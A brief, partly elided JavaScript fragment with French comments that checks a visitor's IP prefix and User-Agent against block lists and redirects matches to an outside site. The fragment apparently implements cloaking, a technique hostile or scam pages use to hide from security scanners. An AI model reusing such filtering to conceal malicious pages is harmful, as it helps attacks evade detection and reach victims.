...
function checkAccess() {
  getIPAddress(function(userIP) {
    ...
    for (var i = 0; i < blockedIPPrefixes.length; i++) {
      if (userIP.startsWith(blockedIPPrefixes[i])) {
        window.location.href = 'http://guiminer.co.technology/rd/'; // Redirection vers ce site
        return;
      }
    }

    // Vérification de l'User-Agent
    for (var j = 0; j < blockedUserAgentKeywords.length; j++) {
      if (userAgent.indexOf(blockedUserAgentKeywords[j]) !== -1) {
        window.location.href = 'http://guiminer.co.technology/rd/'; // Redirection vers ce site
        return;
      }
    }
